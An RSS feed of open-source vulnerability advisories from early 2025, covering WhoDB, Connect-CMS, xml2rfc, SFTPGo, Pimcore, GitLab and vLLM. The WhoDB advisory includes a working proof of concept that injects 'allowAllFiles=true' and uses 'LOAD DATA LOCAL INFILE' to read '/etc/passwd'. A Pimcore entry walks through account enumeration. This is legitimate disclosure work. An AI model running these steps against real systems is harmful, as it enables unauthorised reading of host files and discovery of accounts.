<?xml version="1.0" encoding="UTF-8" ?>
        <rss version="2.0">
            <channel>   
                <title>Open Source Vulnerabilities</title>
                <link>https://oss-vulns.alecmaly.com</link>
                <description>Filtered list of //osv.dev for enhanced searching</description>
        
                <item>
                    <title>GO-2025-3456: 0 | WhoDB has a path traversal opening Sqlite3 database in github.com&#x2F;clidey&#x2F;whodb&#x2F;core</title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GO-2025-3456</link>
                    <pubDate>2025-02-07T22:47:45Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GO-2025-3456'>https://osv.dev/vulnerability/GO-2025-3456</a><br>
                            <b>Published:</b> 2025-02-07T22:47:45Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> go<br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/clidey/whodb/blob/ba6eb81d0ca40baead74bca58b2567166999d6a6/core/src/plugins/sqlite3/db.go#L14-L20'>https://github.com/clidey/whodb/blob/ba6eb81d0ca40baead74bca58b2567166999d6a6/core/src/plugins/sqlite3/db.go#L14-L20</a></li><li>- <a target='_blank' href='https://github.com/clidey/whodb/blob/ba6eb81d0ca40baead74bca58b2567166999d6a6/core/src/plugins/sqlite3/db.go#L26'>https://github.com/clidey/whodb/blob/ba6eb81d0ca40baead74bca58b2567166999d6a6/core/src/plugins/sqlite3/db.go#L26</a></li><li>- <a target='_blank' href='https://github.com/clidey/whodb/commit/547336ac73c8d17929c18c3941c0d5b0099753cc'>https://github.com/clidey/whodb/commit/547336ac73c8d17929c18c3941c0d5b0099753cc</a></li></ul><br>
                            <b>Details:</b> WhoDB has a path traversal opening Sqlite3 database in github.com&#x2F;clidey&#x2F;whodb&#x2F;core
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GO-2025-3457: 0 | WhoDB allows parameter injection in DB connection URIs leading to local file inclusion in github.com&#x2F;clidey&#x2F;whodb&#x2F;core</title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GO-2025-3457</link>
                    <pubDate>2025-02-07T22:47:45Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GO-2025-3457'>https://osv.dev/vulnerability/GO-2025-3457</a><br>
                            <b>Published:</b> 2025-02-07T22:47:45Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> go<br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/clidey/whodb/commit/8d67b767e00552e5eba2b1537179b74bfa662ee1'>https://github.com/clidey/whodb/commit/8d67b767e00552e5eba2b1537179b74bfa662ee1</a></li><li>- <a target='_blank' href='https://github.com/go-sql-driver/mysql/blob/7403860363ca112af503b4612568c3096fecb466/infile.go#L128'>https://github.com/go-sql-driver/mysql/blob/7403860363ca112af503b4612568c3096fecb466/infile.go#L128</a></li></ul><br>
                            <b>Details:</b> WhoDB allows parameter injection in DB connection URIs leading to local file inclusion in github.com&#x2F;clidey&#x2F;whodb&#x2F;core
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-2237-5r9w-vm8j: 8.7 | <b>Connect-CMS information that is restricted to viewing is visible</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-2237-5r9w-vm8j</link>
                    <pubDate>2025-02-07T20:50:20Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-2237-5r9w-vm8j'>https://osv.dev/vulnerability/GHSA-2237-5r9w-vm8j</a><br>
                            <b>Published:</b> 2025-02-07T20:50:20Z<br>
                            <b>Severity:</b> 8.7<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/opensource-workshop/connect-cms/security/advisories/GHSA-2237-5r9w-vm8j'>https://github.com/opensource-workshop/connect-cms/security/advisories/GHSA-2237-5r9w-vm8j</a></li><li>- <a target='_blank' href='https://github.com/opensource-workshop/connect-cms'>https://github.com/opensource-workshop/connect-cms</a></li></ul><br>
                            <b>Details:</b> <b>Connect-CMS information that is restricted to viewing is visible</b><br>### Impact
 - Information that is restricted from viewing in the search results of site searches (※) can still be viewed via the main text (a feature added in v1.8.0).
     - Impact by version
         - v1.8.0 ~ v1.8.3: It will be displayed in the text.
         - v1.8.0 and earlier: It will not be displayed in the body of the text, but the title (frame name) will be displayed with a link.
     - Target viewing restriction function
         - Frame publishing function (private, limited publishing)
         - IP Restriction Page
         - Password setting page

### Patches (fixed version)
 - Apply v1.8.4.

### Workarounds
 - Remove the site search (e.g. hide frames).。

### References
none
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-5rjc-jc28-cwgg: 4.3 | <b>Connect-CMS Access control vulnerability</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-5rjc-jc28-cwgg</link>
                    <pubDate>2025-02-07T20:47:46Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-5rjc-jc28-cwgg'>https://osv.dev/vulnerability/GHSA-5rjc-jc28-cwgg</a><br>
                            <b>Published:</b> 2025-02-07T20:47:46Z<br>
                            <b>Severity:</b> 4.3<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/opensource-workshop/connect-cms/security/advisories/GHSA-5rjc-jc28-cwgg'>https://github.com/opensource-workshop/connect-cms/security/advisories/GHSA-5rjc-jc28-cwgg</a></li><li>- <a target='_blank' href='https://github.com/opensource-workshop/connect-cms'>https://github.com/opensource-workshop/connect-cms</a></li></ul><br>
                            <b>Details:</b> <b>Connect-CMS Access control vulnerability</b><br>### Impact（影響）

There is an Access control vulnerability on the management system of Connect-CMS.
Affected Version : Connect-CMS v1.8.6, 2.4.6 and earlier

### Patches（修正バージョン）

version v1.8.7, v2.4.7

### Workarounds（運用回避手段）

Upgrade Connect-CMS to latest version
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-432c-wxpg-m4q3: 6.9 | <b>xml2rfc has file inclusion irregularities</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-432c-wxpg-m4q3</link>
                    <pubDate>2025-02-07T20:32:27Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-432c-wxpg-m4q3'>https://osv.dev/vulnerability/GHSA-432c-wxpg-m4q3</a><br>
                            <b>Published:</b> 2025-02-07T20:32:27Z<br>
                            <b>Severity:</b> 6.9<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/ietf-tools/xml2rfc/security/advisories/GHSA-432c-wxpg-m4q3'>https://github.com/ietf-tools/xml2rfc/security/advisories/GHSA-432c-wxpg-m4q3</a></li><li>- <a target='_blank' href='https://github.com/ietf-tools/xml2rfc/commit/ec98f9cb4b9a8658222117df037dda473ca3f4e4'>https://github.com/ietf-tools/xml2rfc/commit/ec98f9cb4b9a8658222117df037dda473ca3f4e4</a></li><li>- <a target='_blank' href='https://github.com/ietf-tools/xml2rfc'>https://github.com/ietf-tools/xml2rfc</a></li></ul><br>
                            <b>Details:</b> <b>xml2rfc has file inclusion irregularities</b><br>Version [3.12.0](https:&#x2F;&#x2F;github.com&#x2F;ietf-tools&#x2F;xml2rfc&#x2F;blob&#x2F;main&#x2F;CHANGELOG.md#3120---2021-12-08) changed `xml2rfc` so that it would not access local files without the presence of its new `--allow-local-file-access` flag.
This prevented XML External Entity (XXE) injection attacks with `xinclude` and XML entity references.

It was discovered that `xml2rfc` does not respect `--allow-local-file-access` when a local file is specified as `src` in `artwork` or `sourcecode` elements. Furthermore, XML entity references can include any file inside the source dir and below without using the `--allow-local-file-access` flag. 

The `xml2rfc &amp;lt;= 3.26.0` behaviour:

|  | `xinclude` | XML entity reference | `artwork src=` | `sourcecode src=` |
|---|---|---|---|---|
| without `--allow-local-file-access` flag | No filesystem access | Any file in xml2rfc templates dir and below, any file in source directory and below | Access source directory and below | Access source directory and below |
| with `--allow-local-file-access` flag | Access any file on filesystem[^1] | Access any file on filesystem[^1] | Access source directory and below | Access source directory and below | Access source directory and below |

  [^1]: Access any file of the filesystem with the permissions of the user running `xml2rfc` can access.

### Impact

Anyone running `xml2rfc` as a service that accepts input from external users is impacted by this issue.
Specifying a file in `src` attribute in `artwork` or `sourcecode` elements will cause the contents of that file to appear in xml2rfc’s output results.
But that file has to be inside the same directory as the XML input source file.
For `artwork` and `sourcecode`, `xml2rfc` will not look above the source file directory.

### The proposed new behaviour
- Generalize file access checks.
- Only allow access to files within src dir and below. (xml entity include can access templates dir).
- Always allow access to `templates_dir` for XML entity includes.

New behaviour:

|  | `xinclude` | XML entity reference | `artwork src=` | `sourcecode src=` |
|---|---|---|---|---|
| without `--allow-local-file-access` flag | No filesystem access | No filesystem access _(except for `templates_dir`)_ | No filesystem access | No filesystem access |
| with `--allow-local-file-access` flag | Access source directory and below | Access source directory and below _(Can access`templates_dir`)._ | Access source directory and below | Access source directory and below |

### Workarounds

Use a secure temporary directory to process un-trusted XML files, and do not reuse it for processing other XML documents.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-vj7w-3m8c-6vpx: 7.5 | <b>SFTPGo has insufficient sanitization of user provided rsync command</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-vj7w-3m8c-6vpx</link>
                    <pubDate>2025-02-07T20:31:22Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-vj7w-3m8c-6vpx'>https://osv.dev/vulnerability/GHSA-vj7w-3m8c-6vpx</a><br>
                            <b>Published:</b> 2025-02-07T20:31:22Z<br>
                            <b>Severity:</b> 7.5<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/drakkan/sftpgo/security/advisories/GHSA-vj7w-3m8c-6vpx'>https://github.com/drakkan/sftpgo/security/advisories/GHSA-vj7w-3m8c-6vpx</a></li><li>- <a target='_blank' href='https://github.com/drakkan/sftpgo/commit/b347ab6051f6c501da205c09315fe99cd1fa3ba1'>https://github.com/drakkan/sftpgo/commit/b347ab6051f6c501da205c09315fe99cd1fa3ba1</a></li><li>- <a target='_blank' href='https://github.com/drakkan/sftpgo'>https://github.com/drakkan/sftpgo</a></li></ul><br>
                            <b>Details:</b> <b>SFTPGo has insufficient sanitization of user provided rsync command</b><br>### Impact
SFTPGo supports execution of a defined set of commands via SSH. Besides a set of default commands some optional commands can be activated, one of them being `rsync`: it is disabled in the default configuration and it is limited to the local filesystem, it does not work with cloud&#x2F;remote storage backends.

Due to missing sanitization of the client provided `rsync` command, an authenticated remote user can use some options of the rsync command to read or write files with the permissions of the SFTPGo server process. 

### Patches
This issue was fixed in version v2.6.5 by checking the client provided arguments.

https:&#x2F;&#x2F;github.com&#x2F;drakkan&#x2F;sftpgo&#x2F;commit&#x2F;b347ab6051f6c501da205c09315fe99cd1fa3ba1
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-vr5f-php7-rg24: 6.9 | <b>Pimcore Admin Classic Bundle allows user enumeration</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-vr5f-php7-rg24</link>
                    <pubDate>2025-02-07T20:27:43Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-vr5f-php7-rg24'>https://osv.dev/vulnerability/GHSA-vr5f-php7-rg24</a><br>
                            <b>Published:</b> 2025-02-07T20:27:43Z<br>
                            <b>Severity:</b> 6.9<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/pimcore/admin-ui-classic-bundle/security/advisories/GHSA-vr5f-php7-rg24'>https://github.com/pimcore/admin-ui-classic-bundle/security/advisories/GHSA-vr5f-php7-rg24</a></li><li>- <a target='_blank' href='https://github.com/pimcore/admin-ui-classic-bundle/pull/808'>https://github.com/pimcore/admin-ui-classic-bundle/pull/808</a></li><li>- <a target='_blank' href='https://github.com/pimcore/admin-ui-classic-bundle/commit/96ae555578c3b4df368092d71e07a6c4ddf8fbe9'>https://github.com/pimcore/admin-ui-classic-bundle/commit/96ae555578c3b4df368092d71e07a6c4ddf8fbe9</a></li><li>- <a target='_blank' href='https://github.com/pimcore/admin-ui-classic-bundle'>https://github.com/pimcore/admin-ui-classic-bundle</a></li></ul><br>
                            <b>Details:</b> <b>Pimcore Admin Classic Bundle allows user enumeration</b><br>Description
Summary

Pimcore Admin Classic Bundle allows attackers to enumerate valid accounts because the Forgot password functionality uses different messages when the account is valid vs not.

Details
-&amp;gt; error message discloses existing accounts and leads to user enumeration on the target via &quot;Forgot password&quot; function. since no generic error message is being implemented.

PoC
![image](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;866e4cd1-25b2-4ed8-8292-6c528ae660d5)


Enter first a valid account email address and click on submit
![image](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;7aaa1723-b0f9-4a76-b943-e1b01d1f37a9)


A green message validating the account exists is shown and a login link is sent to the email
![image](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;7adb1f05-7339-4265-95c9-4d4817d4a6a1)


now go back and use a random email from temp-mail to test with a non existant account
![image](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;5ce0bb53-16c3-4f34-9541-9e01b49c7472)


![image](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;213e838f-0944-484e-93bf-7468ed9e699d)


click on submit and get an error in red that a problem occured
![image](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;c30dc56f-e612-46a0-945d-e9dc5f14da39)


Impact
user enumeration is a confidentiality threat , that could potentially lead to an attacker to enumerate valid accounts and maybe taking over accounts in case combined with credential stuffing on an organisation .

A remedition would be to change the error message in both cases ( valid and invalid emails ) to what we call a &quot;synchronised error &quot; it would be for example : &quot; if the given email address is linked to an account , then a login link would be sent to that email &quot; or something along those lines
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-gitlab-2023-6386: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-gitlab-2023-6386</link>
                    <pubDate>2025-02-07T07:28:12.605Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-gitlab-2023-6386'>https://osv.dev/vulnerability/BIT-gitlab-2023-6386</a><br>
                            <b>Published:</b> 2025-02-07T07:28:12.605Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://gitlab.com/gitlab-org/gitlab/-/issues/433147'>https://gitlab.com/gitlab-org/gitlab/-/issues/433147</a></li><li>- <a target='_blank' href='https://hackerone.com/reports/2261581'>https://hackerone.com/reports/2261581</a></li></ul><br>
                            <b>Details:</b> <b></b><br>A denial of service vulnerability was identified in GitLab CE&#x2F;EE, affecting all versions from 15.11 prior to 16.6.7, 16.7 prior to 16.7.5 and 16.8 prior to 16.8.2 which allows an attacker to spike the GitLab instance resource usage resulting in service degradation.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-gitlab-2024-1539: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-gitlab-2024-1539</link>
                    <pubDate>2025-02-07T07:24:47.498Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-gitlab-2024-1539'>https://osv.dev/vulnerability/BIT-gitlab-2024-1539</a><br>
                            <b>Published:</b> 2025-02-07T07:24:47.498Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://gitlab.com/gitlab-org/gitlab/-/issues/442049'>https://gitlab.com/gitlab-org/gitlab/-/issues/442049</a></li><li>- <a target='_blank' href='https://hackerone.com/reports/2369988'>https://hackerone.com/reports/2369988</a></li></ul><br>
                            <b>Details:</b> <b></b><br>An issue has been discovered in GitLab EE affecting all versions starting from 15.2 prior to 16.9.7, starting from 16.10 prior to 16.10.5, and starting from 16.11 prior to 16.11.2. It was possible to disclose updates to issues to a banned group member using the API.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-gitlab-2024-2878: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-gitlab-2024-2878</link>
                    <pubDate>2025-02-07T07:22:41.794Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-gitlab-2024-2878'>https://osv.dev/vulnerability/BIT-gitlab-2024-2878</a><br>
                            <b>Published:</b> 2025-02-07T07:22:41.794Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://gitlab.com/gitlab-org/gitlab/-/issues/451918'>https://gitlab.com/gitlab-org/gitlab/-/issues/451918</a></li><li>- <a target='_blank' href='https://hackerone.com/reports/2416356'>https://hackerone.com/reports/2416356</a></li><li>- <a target='_blank' href='https://about.gitlab.com/releases/2024/05/08/patch-release-gitlab-16-11-2-released/'>https://about.gitlab.com/releases/2024/05/08/patch-release-gitlab-16-11-2-released/</a></li></ul><br>
                            <b>Details:</b> <b></b><br>An issue has been discovered in GitLab CE&#x2F;EE affecting all versions starting from 15.7 prior to 16.9.7, starting from 16.10 prior to 16.10.5, and starting from 16.11 prior to 16.11.2. It was possible for an attacker to cause a denial of service by crafting unusual search terms for branch names.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-gitlab-2024-3976: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-gitlab-2024-3976</link>
                    <pubDate>2025-02-07T07:21:27.185Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-gitlab-2024-3976'>https://osv.dev/vulnerability/BIT-gitlab-2024-3976</a><br>
                            <b>Published:</b> 2025-02-07T07:21:27.185Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://gitlab.com/gitlab-org/gitlab/-/issues/457140'>https://gitlab.com/gitlab-org/gitlab/-/issues/457140</a></li><li>- <a target='_blank' href='https://hackerone.com/reports/2470939'>https://hackerone.com/reports/2470939</a></li><li>- <a target='_blank' href='https://about.gitlab.com/releases/2024/05/08/patch-release-gitlab-16-11-2-released/'>https://about.gitlab.com/releases/2024/05/08/patch-release-gitlab-16-11-2-released/</a></li></ul><br>
                            <b>Details:</b> <b></b><br>An issue has been discovered in GitLab CE&#x2F;EE affecting all versions starting from 14.0 prior to 16.9.7, starting from 16.10 prior to 16.10.5, and starting from 16.11 prior to 16.11.2. It was possible to disclose via the UI the confidential issues title and description from a public project to unauthorised instance users.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-gitlab-2024-5528: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-gitlab-2024-5528</link>
                    <pubDate>2025-02-07T07:17:30.379Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-gitlab-2024-5528'>https://osv.dev/vulnerability/BIT-gitlab-2024-5528</a><br>
                            <b>Published:</b> 2025-02-07T07:17:30.379Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://gitlab.com/gitlab-org/gitlab/-/issues/464558'>https://gitlab.com/gitlab-org/gitlab/-/issues/464558</a></li><li>- <a target='_blank' href='https://hackerone.com/reports/2523654'>https://hackerone.com/reports/2523654</a></li><li>- <a target='_blank' href='https://about.gitlab.com/releases/2024/07/10/patch-release-gitlab-17-1-2-released/'>https://about.gitlab.com/releases/2024/07/10/patch-release-gitlab-17-1-2-released/</a></li></ul><br>
                            <b>Details:</b> <b></b><br>An issue was discovered in GitLab CE&#x2F;EE affecting all versions prior to 16.11.6, starting from 17.0 prior to 17.0.4, and starting from 17.1 prior to 17.1.2, which allows a subdomain takeover in GitLab Pages.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-gitlab-2024-6356: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-gitlab-2024-6356</link>
                    <pubDate>2025-02-07T07:16:51.890Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-gitlab-2024-6356'>https://osv.dev/vulnerability/BIT-gitlab-2024-6356</a><br>
                            <b>Published:</b> 2025-02-07T07:16:51.890Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://gitlab.com/gitlab-org/gitlab/-/issues/469108'>https://gitlab.com/gitlab-org/gitlab/-/issues/469108</a></li><li>- <a target='_blank' href='https://hackerone.com/reports/2575051'>https://hackerone.com/reports/2575051</a></li></ul><br>
                            <b>Details:</b> <b></b><br>An issue was discovered in GitLab EE affecting all versions starting from 16.0 prior to 17.0.6, starting from 17.1 prior to 17.1.4, and starting from 17.2 prior to 17.2.2, which allowed cross project access for Security policy bot.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-gitlab-2024-9631: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-gitlab-2024-9631</link>
                    <pubDate>2025-02-07T07:10:40.789Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-gitlab-2024-9631'>https://osv.dev/vulnerability/BIT-gitlab-2024-9631</a><br>
                            <b>Published:</b> 2025-02-07T07:10:40.789Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://gitlab.com/gitlab-org/gitlab/-/issues/480867'>https://gitlab.com/gitlab-org/gitlab/-/issues/480867</a></li><li>- <a target='_blank' href='https://hackerone.com/reports/2650086'>https://hackerone.com/reports/2650086</a></li></ul><br>
                            <b>Details:</b> <b></b><br>An issue was discovered in GitLab CE&#x2F;EE affecting all versions starting from 13.6 prior to 17.2.9, starting from 17.3 prior to 17.3.5, and starting from 17.4 prior to 17.4.2, where viewing diffs of MR with conflicts can be slow.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-rm76-4mrf-v9r8: 2.6 | <b>vLLM uses Python 3.12 built-in hash() which leads to predictable hash collisions in prefix cache</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-rm76-4mrf-v9r8</link>
                    <pubDate>2025-02-06T20:00:05Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-rm76-4mrf-v9r8'>https://osv.dev/vulnerability/GHSA-rm76-4mrf-v9r8</a><br>
                            <b>Published:</b> 2025-02-06T20:00:05Z<br>
                            <b>Severity:</b> 2.6<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/vllm-project/vllm/security/advisories/GHSA-rm76-4mrf-v9r8'>https://github.com/vllm-project/vllm/security/advisories/GHSA-rm76-4mrf-v9r8</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/pull/99541'>https://github.com/python/cpython/pull/99541</a></li><li>- <a target='_blank' href='https://github.com/vllm-project/vllm/pull/12621'>https://github.com/vllm-project/vllm/pull/12621</a></li><li>- <a target='_blank' href='https://github.com/python/cpython/commit/432117cd1f59c76d97da2eaff55a7d758301dbc7'>https://github.com/python/cpython/commit/432117cd1f59c76d97da2eaff55a7d758301dbc7</a></li><li>- <a target='_blank' href='https://github.com/vllm-project/vllm/commit/73b35cca7f3745d07d439c197768b25d88b6ab7f'>https://github.com/vllm-project/vllm/commit/73b35cca7f3745d07d439c197768b25d88b6ab7f</a></li><li>- <a target='_blank' href='https://github.com/vllm-project/vllm'>https://github.com/vllm-project/vllm</a></li></ul><br>
                            <b>Details:</b> <b>vLLM uses Python 3.12 built-in hash() which leads to predictable hash collisions in prefix cache</b><br>### Summary

Maliciously constructed statements can lead to hash collisions, resulting in cache reuse, which can interfere with subsequent responses and cause unintended behavior.

### Details

Prefix caching makes use of Python&#x27;s built-in hash() function. As of Python 3.12, the behavior of hash(None) has changed to be a predictable constant value. This makes it more feasible that someone could try exploit hash collisions.

### Impact

The impact of a collision would be using cache that was generated using different content. Given knowledge of prompts in use and predictable hashing behavior, someone could intentionally populate the cache using a prompt known to collide with another prompt in use. 

### Solution

We address this problem by initializing hashes in vllm with a value that is no longer constant and predictable. It will be different each time vllm runs. This restores behavior we got in Python versions prior to 3.12.

Using a hashing algorithm that is less prone to collision (like sha256, for example) would be the best way to avoid the possibility of a collision. However, it would have an impact to both performance and memory footprint. Hash collisions may still occur, though they are no longer straight forward to predict.

To give an idea of the likelihood of a collision, for randomly generated hash values (assuming the hash generation built into Python is uniformly distributed), with a cache capacity of 50,000 messages and an average prompt length of 300, a collision will occur on average once every 1 trillion requests.

### References

* https:&#x2F;&#x2F;github.com&#x2F;vllm-project&#x2F;vllm&#x2F;pull&#x2F;12621
* https:&#x2F;&#x2F;github.com&#x2F;python&#x2F;cpython&#x2F;commit&#x2F;432117cd1f59c76d97da2eaff55a7d758301dbc7
* https:&#x2F;&#x2F;github.com&#x2F;python&#x2F;cpython&#x2F;pull&#x2F;99541
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-c7w4-9wv8-7x7c: 8.6 | <b>WhoDB allows parameter injection in DB connection URIs leading to local file inclusion</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-c7w4-9wv8-7x7c</link>
                    <pubDate>2025-02-06T19:58:37Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-c7w4-9wv8-7x7c'>https://osv.dev/vulnerability/GHSA-c7w4-9wv8-7x7c</a><br>
                            <b>Published:</b> 2025-02-06T19:58:37Z<br>
                            <b>Severity:</b> 8.6<br>
                            <b>Langs:</b> go<br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/clidey/whodb/security/advisories/GHSA-c7w4-9wv8-7x7c'>https://github.com/clidey/whodb/security/advisories/GHSA-c7w4-9wv8-7x7c</a></li><li>- <a target='_blank' href='https://github.com/clidey/whodb/commit/8d67b767e00552e5eba2b1537179b74bfa662ee1'>https://github.com/clidey/whodb/commit/8d67b767e00552e5eba2b1537179b74bfa662ee1</a></li><li>- <a target='_blank' href='https://github.com/clidey/whodb'>https://github.com/clidey/whodb</a></li><li>- <a target='_blank' href='https://github.com/go-sql-driver/mysql/blob/7403860363ca112af503b4612568c3096fecb466/infile.go#L128'>https://github.com/go-sql-driver/mysql/blob/7403860363ca112af503b4612568c3096fecb466/infile.go#L128</a></li></ul><br>
                            <b>Details:</b> <b>WhoDB allows parameter injection in DB connection URIs leading to local file inclusion</b><br>### Summary

The application is vulnerable to parameter injection in database connection strings, which allows an attacker to read local files on the machine the application is running on.

### Details

The application uses string concatenation to build database connection URIs which are then passed to corresponding libraries responsible for setting up the database connections.

This string concatenation is done unsafely and without escaping or encoding the user input. This allows an user, in many cases, to inject arbitrary parameters into the URI string. These parameters can be potentially dangerous depending on the libraries used.

One of these dangerous parameters is `allowAllFiles` in the library `github.com&#x2F;go-sql-driver&#x2F;mysql`. Should this be set to `true`, the library enables running the `LOAD DATA LOCAL INFILE` query on any file on the host machine (in this case, the machine that WhoDB is running on). Source: https:&#x2F;&#x2F;github.com&#x2F;go-sql-driver&#x2F;mysql&#x2F;blob&#x2F;7403860363ca112af503b4612568c3096fecb466&#x2F;infile.go#L128

By injecting `&amp;allowAllFiles=true` into the connection URI and connecting to any MySQL server (such as an attacker-controlled one), the attacker is able to read local files.

### PoC

As this vulnerability does not require sending requests manually and can all be done using the WhoDB UI, screenshots are provided instead of HTTP requests.

For this proof-of-concept, a clean instance of WhoDB and MySQL were set up using podman (docker is a suitable alternative):

```
podman network create whodb-poc
podman run -d -p 8080:8080 --network whodb-poc docker.io&#x2F;clidey&#x2F;whodb
podman run -d --name mysql -e MYSQL_ROOT_PASSWORD=password --network whodb-poc docker.io&#x2F;mysql:9
```

The attacker connects to the database via WhoDB. Note that in the `Loc` field, the string `&amp;allowAllFiles=true` is inserted:

![2025-01-21-13-28-08](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;28709707-97e4-4d26-b61c-5462db6dd43f)

After connecting, the attacker navigates to the scratchpad in `&#x2F;scratchpad`.

The attacker first creates a demo table:
```sql
CREATE TABLE poc (
    line TEXT
);
```

The attacker then enables loading files from the server side. For the sake of clarity, do note that while this is required, the file is not being read from the remote server where MySQL is running, but the local machine that WhoDB is running on.
```sql
SET GLOBAL local_infile=1;
```

The attacker then uses the `LOAD DATA LOCAL INFILE` statement to read the contents of `&#x2F;etc&#x2F;passwd` (in this case from inside the container where WhoDB is running) into the previously created table:
```sql
LOAD DATA LOCAL INFILE &#x27;&#x2F;etc&#x2F;passwd&#x27;
INTO TABLE poc
FIELDS TERMINATED BY &#x27;\0&#x27;
LINES TERMINATED BY &#x27;\n&#x27;;
```

The attacker then navigates to the `poc` table in the _Tables_ view and observes that the file has been read successfully:

![2025-01-21-14-04-47](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;c8f499ce-0d40-49ba-a2c6-fe2d12c677c5)

### Impact

While this proof-of-concept demonstrates local file inclusion, the root cause of the issue is the unsafe construction of database connection URIs from user input. Not all database connector libraries used in WhoDB were inspected; there may be libraries which allow for even more impactful parameters.

